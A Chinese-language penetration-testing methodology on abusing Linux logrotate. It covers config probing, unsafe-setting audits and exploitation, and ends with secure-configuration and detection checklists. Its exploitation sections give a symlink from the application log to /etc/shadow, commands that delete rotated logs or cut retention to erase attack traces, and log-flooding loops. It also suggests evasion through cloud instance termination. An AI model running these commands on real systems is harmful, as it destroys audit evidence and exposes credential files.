# 日志轮转攻击 (Log Rotation Attack)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供日志轮转攻击的系统化方法论，帮助测试人员发现并利用日志轮转配置缺陷，评估日志保留策略的安全性。

### 1.2 适用范围
本文档适用于以下场景：
- Linux/Unix 系统日志安全测试
- 日志保留策略评估
- 日志存储完整性验证
- 取证能力评估

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 系统管理员
- 取证分析师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

日志轮转攻击是指攻击者利用日志轮转（Log Rotation）机制的配置缺陷或时间窗口，达到删除攻击痕迹、破坏日志完整性或消耗系统资源的目的。

**核心原理：**
- **时间窗口利用**：在日志轮转发生前后的短暂时间内，日志可能处于不一致状态
- **配置缺陷利用**：轮转配置不当导致日志过早删除或未正确压缩
- **资源耗尽**：通过触发频繁轮转消耗系统资源
- **符号链接攻击**：利用轮转过程中的文件操作进行攻击

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **高日志量系统** | API 网关、负载均衡器 | 频繁轮转导致日志丢失 |
| **磁盘空间受限** | 容器、虚拟机 | 轮转失败或日志截断 |
| **合规审计系统** | 金融、医疗系统 | 日志保留期不足 |
| **分布式系统** | 微服务架构 | 轮转时间不同步 |
| **云环境** | 自动伸缩组 | 实例终止日志丢失 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**轮转配置探测：**
```bash
# 检查 logrotate 配置
cat /etc/logrotate.conf
cat /etc/logrotate.d/*

# 检查轮转时间表
ls -la /var/log/
# 观察 .1, .2.gz 等轮转文件

# 检查轮转策略
# - daily/weekly/monthly：轮转频率
# - rotate N：保留数量
# - compress：是否压缩
```

**日志保留期探测：**
```bash
# 检查日志保留时间
ls -lt /var/log/

# 计算实际保留天数
# 找到最旧的日志文件
find /var/log -name "*.gz" -type f | head -5

# 检查是否有日志缺失
# 比较文件编号连续性
```

**时间窗口探测：**
```bash
# 监控轮转发生时间
# logrotate 通常在 cron 中配置
cat /etc/cron.daily/logrotate

# 默认通常在凌晨执行
# 在这个时间窗口进行测试
```

#### 2.3.2 白盒测试

**配置审计：**
```bash
# 危险配置示例
/var/log/application.log {
    daily
    rotate 3          # 危险：保留太少
    compress
    missingok
    notifempty
    create 0644 root root  # 危险：权限可能过宽
    postrotate
        # 危险：后轮转脚本可能有漏洞
        /usr/bin/killall -HUP rsyslogd
    endscript
}

# 危险：无延迟压缩
/var/log/*.log {
    daily
    rotate 7
    compress        # 立即压缩，可能丢失数据
    # delaycompress  # 应该使用这个
}
```

**代码审计要点：**
```python
# 危险：自定义轮转逻辑无错误处理
def rotate_logs():
    for log in logs:
        os.rename(log, log + ".1")  # 无异常处理
        open(log, 'w').close()

# 危险：竞态条件
# 检查文件存在后操作
if os.path.exists(log_file):
    # 这里可能被利用
    os.remove(log_file)
```

### 2.4 漏洞利用方法

#### 2.4.1 时间窗口攻击

**轮转期间攻击：**
```bash
# 在轮转发生时进行攻击
# 此时日志可能暂时不记录

# 1. 监控轮转时间
while true; do
    ls -l /var/log/application.log
    sleep 1
done

# 2. 在轮转瞬间发送攻击请求
# 日志文件被重命名到新文件的过程中
# 可能有短暂的日志丢失窗口
```

**竞态条件利用：**
```bash
# 符号链接攻击
# 1. 创建指向敏感文件的符号链接
ln -sf /etc/shadow /var/log/application.log

# 2. 等待轮转发生
# 轮转时可能覆盖或读取敏感文件

# 3. 检查轮转后的文件
cat /var/log/application.log.1
```

#### 2.4.2 日志删除攻击

**强制轮转：**
```bash
# 手动触发轮转
logrotate -f /etc/logrotate.conf

# 针对特定应用
logrotate -f /etc/logrotate.d/application

# 攻击后清理痕迹
rm -f /var/log/*.gz
```

**轮转配置篡改：**
```bash
# 修改轮转配置减少保留期
# 原始配置：rotate 30
# 修改为：rotate 1

sed -i 's/rotate 30/rotate 1/' /etc/logrotate.d/application

# 触发轮转
logrotate -f /etc/logrotate.d/application

# 攻击痕迹被快速删除
```

#### 2.4.3 资源耗尽攻击

**日志洪水攻击：**
```bash
# 发送大量日志触发频繁轮转
for i in {1..1000000}; do
    logger "Attack message $i"
done

# 可能导致：
# 1. 磁盘空间耗尽
# 2. 轮转失败
# 3. 日志服务崩溃
```

**压缩炸弹攻击：**
```bash
# 如果日志被压缩后存储
# 发送可高度压缩的数据

# 创建 1GB 的重复数据
yes "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | head -c 1G > /var/log/application.log

# 压缩后可能很小，但解压时消耗大量资源
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过日志保留策略

```bash
# 如果系统有严格的日志保留策略
# 攻击后等待足够时间让日志轮转删除

# 检查保留策略
grep -r "rotate" /etc/logrotate.d/

# 计算需要等待的时间
# 例如：daily + rotate 7 = 7 天后日志被删除

# 在安全的时间后进行分析或报告
```

#### 2.5.2 利用云环境特性

```bash
# 云环境中实例可能频繁重启
# 本地日志在重启后丢失

# 利用自动伸缩
# 1. 攻击后终止实例
# 2. 新实例没有攻击日志

# 利用无服务器架构
# 函数执行日志可能不完整
```

#### 2.5.3 分布式系统攻击

```bash
# 在微服务架构中
# 不同服务日志轮转时间可能不同

# 1. 识别日志轮转时间差
# 2. 在时间差内跨服务攻击
# 3. 完整攻击链不会被任何单个日志文件记录
```

---

## 第三部分：附录

### 3.1 日志轮转安全配置检查清单

| **配置项** | **安全设置** | **风险说明** |
| :--- | :--- | :--- |
| 保留数量 | rotate 30+ | 过少导致取证困难 |
| 压缩延迟 | delaycompress | 立即压缩可能丢失数据 |
| 文件权限 | create 0640 | 过宽权限可被利用 |
| 轮转频率 | 根据日志量调整 | 过频导致管理开销 |
| 远程备份 | 配置远程存储 | 防止本地篡改 |

### 3.2 日志轮转攻击检测清单

- [ ] 检查非正常时间的轮转
- [ ] 监控日志文件大小异常
- [ ] 检测轮转配置变更
- [ ] 审计轮转后文件权限
- [ ] 验证远程备份完整性

### 3.3 参考资源

- [Linux logrotate Documentation](https://linux.die.net/man/8/logrotate)
- [CWE-778: Insufficient Logging](https://cwe.mitre.org/data/definitions/778.html)
- [NIST 800-92 Guide to Computer Security Log Management](https://csrc.nist.gov/publications/detail/sp/800-92/final)
